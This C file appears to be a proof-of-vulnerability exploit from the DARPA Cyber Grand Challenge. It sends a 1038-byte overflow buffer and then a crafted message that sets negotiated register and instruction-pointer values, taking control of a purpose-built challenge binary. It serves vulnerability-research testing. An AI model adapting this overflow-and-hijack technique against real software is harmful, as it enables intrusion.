/*

Author: James Nuttall <james@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libpov.h>

#define CMD_LEN 9

typedef struct { 

	unsigned short flag;
	unsigned short length;
	unsigned char command[CMD_LEN];
	unsigned int checkvalue;

} programMessageType;


#define TO_CB   1
#define FROM_CB 0


int SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

int ReceiveFromCB(char *buf, int length) {
  size_t total_received = 0;
  size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}


int main(void)
{
	programMessageType theMessage;
	int i;
	unsigned int checkval;
	size_t size;

	type1_vals t1vals;
 	type1_negotiate(0xffffffff, 0xffffffff, 5, &t1vals);

 	// Construct normal message with payload addresses
	theMessage.flag = 0x5aa5;

	theMessage.length = CMD_LEN;

	theMessage.command[0] = 0x11;
	*( unsigned int * )&(theMessage.command[1]) = t1vals.regval;
	*( unsigned int * )&(theMessage.command[5]) = t1vals.ipval;

	for (i=0; i < sizeof(programMessageType)-4; ++i)
		checkval = checkval + *((unsigned char *)&theMessage+i)*(i+1);

	theMessage.checkvalue = checkval;

	// Construct overflow
	const int len = 1038;
	unsigned char bad_buff[len];
	for( int x = 0; x < len; x++ )
	{
		bad_buff[x] = '\xa5';
	}

	// Send overflow
	SendToCB( (void*)bad_buff, len );

	// Send message with payload
	SendToCB( (void *)&theMessage, sizeof(programMessageType) );

	return 0;
}







